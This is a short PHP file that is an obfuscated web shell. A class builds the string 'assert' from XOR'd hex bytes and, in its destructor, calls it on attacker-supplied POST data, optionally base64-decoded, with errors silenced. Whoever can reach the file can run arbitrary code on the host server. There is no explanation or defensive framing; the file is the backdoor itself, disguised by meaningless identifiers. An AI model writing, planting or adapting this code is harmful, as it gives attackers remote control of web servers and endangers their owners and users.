<?php 
class GGIN { 
    function KLRF() {
        $HdCu = "\x5a" ^ "\x3b";
        $qMcr = "\x18" ^ "\x6b";
        $PBGX = "\xb3" ^ "\xc0";
        $iKYP = "\xf1" ^ "\x94";
        $QjbD = "\x40" ^ "\x32";
        $qjDJ = "\xd2" ^ "\xa6";
        $Waeo =$HdCu.$qMcr.$PBGX.$iKYP.$QjbD.$qjDJ;
        return $Waeo;
    }
    function __destruct(){
        $BbDn=$this->KLRF();
        @$BbDn($this->XC);
    }
}
$ggin = new GGIN();
@$ggin->XC = isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST['mr6'];
?>